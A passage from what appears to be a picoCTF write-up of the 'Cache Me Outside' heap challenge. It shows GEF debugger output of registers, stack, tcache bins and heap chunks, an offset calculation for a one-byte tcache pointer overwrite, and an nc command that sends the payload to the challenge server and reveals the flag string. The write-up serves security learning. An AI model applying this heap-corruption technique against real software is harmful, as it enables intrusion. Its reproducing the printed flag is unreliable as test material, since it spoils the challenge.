$r10   : 0x3               
$r11   : 0x00007ffff78979c0  →  <free+0> push r15
$r12   : 0x0000000000400720  →  <_start+0> xor ebp, ebp
$r13   : 0x00007fffffffe190  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdff0│+0x0000: 0x00007fffffffe198  →  0x00007fffffffe457  →  "/home/faisal/Documents/pico-ctf/cache-me-outside/h[...]"	 ← $rsp
0x00007fffffffdff8│+0x0008: 0x0000000100000000
0x00007fffffffe000│+0x0010: 0x0000000000000000
0x00007fffffffe008│+0x0018: 0x00007fffffffe030  →  0x0000000000603890  →  0x0000000000603800  →  0x0000000000000000
0x00007fffffffe010│+0x0020: 0x00000007ffffffff
0x00007fffffffe018│+0x0028: 0x00000000006034a0  →  "Congrats! Your flag is: hello\n"
0x00007fffffffe020│+0x0030: 0x0000000000603800  →  0x0000000000000000
0x00007fffffffe028│+0x0038: 0x0000000000602260  →  0x00000000fbad2488
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4009a8 <main+417>       mov    rax, QWORD PTR [rbp-0x80]
     0x4009ac <main+421>       mov    rdi, rax
     0x4009af <main+424>       call   0x400680 <free@plt>
 →   0x4009b4 <main+429>       mov    DWORD PTR [rbp-0xa0], 0x0
     0x4009be <main+439>       mov    BYTE PTR [rbp-0xa1], 0x0
     0x4009c5 <main+446>       lea    rdi, [rip+0x14c]        # 0x400b18
     0x4009cc <main+453>       call   0x400690 <puts@plt>
     0x4009d1 <main+458>       lea    rdi, [rip+0x166]        # 0x400b3e
     0x4009d8 <main+465>       mov    eax, 0x0
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "heapedit_patche", stopped 0x4009b4 in main (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4009b4 → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap bins tcache 
────────────────────────────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────────────────────────────
Tcachebins[idx=7, size=0x90, count=2] ←  Chunk(addr=0x603890, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) 
gef➤  heap chunks
Chunk(addr=0x602010, size=0x250, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000602010     00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x602260, size=0x230, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000602260     88 24 ad fb 00 00 00 00 96 24 60 00 00 00 00 00    .$.......$`.....]
Chunk(addr=0x602490, size=0x1010, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000602490     68 65 6c 6c 6f 0a 00 00 00 00 00 00 00 00 00 00    hello...........]
Chunk(addr=0x6034a0, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00000000006034a0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603530, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000603530     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x6035c0, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00000000006035c0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603650, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000603650     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x6036e0, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00000000006036e0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603770, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000603770     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000603800     00 00 00 00 00 00 00 00 21 20 59 6f 75 72 20 66    ........! Your f]
Chunk(addr=0x603890, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000603890     00 38 60 00 00 00 00 00 68 69 73 20 77 6f 6e 27    .8`.....his won']
Chunk(addr=0x603920, size=0x1f6f0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk
gef➤  find /sg 0x602010,+0x1000, 0x603890
Invalid size granularity.
gef➤  find /g 0x602010,+0x1000, 0x603890
0x602088
1 pattern found.
gef➤  p/d 0x602088 - 0x6034a0
$2 = -5144
gef➤  quit
```

## Flag

We fetch the flag by finally interacting with the server supplying our desired values:

```
kali-amd64# { echo "-5144"; printf "\x00";} | nc mercury.picoctf.net 36605
You may edit one byte in the program.
Address: Value: lag is: picoCTF{702d6d8ea75c4c92fe509690a593fee2}
```
